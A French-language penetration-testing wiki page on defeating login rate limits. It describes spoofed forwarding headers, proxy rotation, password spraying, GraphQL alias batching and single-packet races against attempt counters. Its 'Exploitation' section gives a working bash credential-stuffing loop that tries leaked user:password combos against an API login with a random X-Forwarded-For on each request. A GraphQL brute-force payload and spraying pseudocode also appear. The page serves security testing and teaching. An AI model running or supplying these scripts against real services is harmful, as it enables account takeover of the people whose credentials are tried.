---
title: "Limites de débit et automatisation : contournement de throttle, credential stuffing et password spraying"
description: "Comment une limitation de débit faible ou mal configurée ouvre les endpoints d'identifiants à l'automatisation : clé par IP contre par compte, rotation d'en-têtes, batching GraphQL/JSON, password spraying, et la race single-packet."
keywords:
  - contournement de limitation de débit
  - credential stuffing
  - password spraying
  - brute force
  - batching GraphQL
  - X-Forwarded-For
---

# Limites de débit et automatisation

La limitation de débit est le contrôle qui transforme un brute force théorique en un brute force impraticable. Lorsqu'elle est absente, mal configurée ou appliquée de manière incohérente, les endpoints d'identifiants deviennent automatisables, et la liste de comptes issue de l'[énumération](account-enumeration.md) devient une prise de contrôle de compte. Cette page porte sur le contournement du throttle et les formes d'attaque qui évitent de le déclencher.

## Sur quoi le limiteur se base

Chaque contournement commence par identifier la clé du compteur, puis par faire en sorte que chaque requête porte une valeur différente pour celle-ci.

### Limites par IP

Si la limite compte les requêtes par IP source, faites tourner la source apparente :

- **En-têtes forwarded** : de nombreuses applications et middlewares font confiance à `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `X-Originating-IP`, `Forwarded` ou `True-Client-IP`. Envoyez une valeur différente (même aléatoire) à chaque requête :

```
POST /login HTTP/1.1
X-Forwarded-For: 1.2.3.4
```

Faites tourner la valeur avec le mode pitchfork de Burp Intruder ou un script. Certaines stacks honorent un en-tête *dupliqué*, ou retiennent la première ou la dernière valeur différemment du limiteur, ce qui constitue un contournement en soi.
- **Rotation réelle** : un pool de proxies ou une grande plage IPv6 donne des sources réellement distinctes quand les en-têtes ne sont pas de confiance.

### Limites par compte

Si la limite compte les échecs par compte, ne martelez pas un seul compte. Le **password spraying** inverse la boucle : essayez un mot de passe plausible contre chaque compte, puis le mot de passe suivant, pour qu'aucun compte n'atteigne son seuil de verrouillage.

```
for each password in [Winter2026!, Company@123, Password1!]:
    for each user in confirmed_accounts:
        try(user, password)
    wait(lockout_window)
```

### Limites manquantes ou incohérentes

La connexion web est souvent throttlée tandis que des chemins équivalents ne le sont pas. Testez l'**API** (`/api/login`, `/oauth/token`), le backend **mobile**, les endpoints hérités, et tout vérificateur alternatif. Une limite sur `/login` ne signifie rien si `/api/v1/authenticate` n'en a aucune.

## Regrouper de nombreuses tentatives en une seule requête

Certains backends comptent les *requêtes*, pas les *tentatives*, donc empaqueter de nombreuses tentatives dans une seule requête passe sous le compteur :

- **Batching par alias GraphQL** : une seule requête peut appeler la mutation de connexion de nombreuses fois sous différents alias, chacun avec un mot de passe différent, en une seule requête HTTP :

```graphql
mutation {
  a: login(user:"victim", password:"p1"){ token }
  b: login(user:"victim", password:"p2"){ token }
  c: login(user:"victim", password:"p3"){ token }
}
```

- **Tableaux JSON / paramètres multi-valeurs** : les endpoints qui acceptent un tableau d'identifiants, ou qui itèrent un paramètre répété, laissent une requête essayer de nombreuses valeurs.

## Faire la course contre le compteur

Lorsqu'une limite existe mais est incrémentée après le contrôle, tirez de nombreuses requêtes en parallèle pour qu'elles soient toutes validées avant que le compteur ne rattrape. L'**attaque single-packet de Turbo Intruder** de Burp (et le multiplexage HTTP/2) fait atterrir de nombreuses requêtes dans la même fenêtre, mettant en échec un « N tentatives puis blocage » naïf qui n'est pas atomique. C'est la même primitive utilisée contre les endpoints de vérification d'OTP.

## Exploitation

Une campagne de credential stuffing contre une liste de comptes confirmés, analysant les combos `user:password` et faisant tourner l'en-tête source à chaque requête :

```bash
# creds.txt holds user:password combos, restricted to confirmed accounts
while IFS=: read -r user pass; do
  xff="$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://target/api/login \
    -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: $xff" \
    -d "{\"user\":\"$user\",\"pass\":\"$pass\"}")
  [ "$code" = "200" ] && echo "HIT  $user:$pass"
done < creds.txt
```

Chaque itération analyse un combo et envoie un `X-Forwarded-For` aléatoire frais, de sorte qu'un limiteur par IP qui fait confiance à l'en-tête ne voit jamais de source répétée. Burp Intruder fait de même avec le fichier de combos réparti sur deux mots-clés en mode pitchfork et un payload généré pour l'en-tête. Combinez avec la sortie de l'énumération pour n'essayer que des comptes actifs, ce qui maintient le volume (et le risque de verrouillage) bas et le taux de succès haut.

## Outils

- **Burp Suite Intruder / Turbo Intruder** : jeux de payloads, rotation d'en-têtes, race single-packet.
- **ffuf** / **hydra** / **medusa** : attaques d'identifiants scriptées.
- Listes de mots/combos de credential stuffing construites à partir de l'ensemble de comptes énuméré et des corpus de fuites.

## Références

- PortSwigger Web Security Academy : [Rate limiting bypass](https://portswigger.net/web-security/authentication) et [Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions)
- OWASP WSTG : [Testing for Weak Lock Out Mechanism (WSTG-ATHN-03)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)
- OWASP : [Credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
